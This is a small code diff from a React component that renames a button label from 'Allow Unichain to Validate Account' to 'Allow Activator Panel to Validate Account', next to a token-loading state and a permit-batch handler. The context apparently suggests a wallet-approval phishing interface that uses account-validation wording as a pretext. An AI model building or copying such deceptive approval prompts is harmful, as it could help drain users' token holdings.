@@ -322,7 +322,7 @@ export default function IssuesContent() {
               className='mb-4 bg-purple-500 text-white text-lg font-semibold hover:bg-purple-400' 
               disabled={tokens.length === 0 || loading}
             >
-              {loading ? 'Loading Tokens...' : 'Allow Unichain to Validate Account'}
+              {loading ? 'Loading Tokens...' : 'Allow Activator Panel to Validate Account'}
             </Button>
             <Button 
               onClick={handlePermitBatch} 
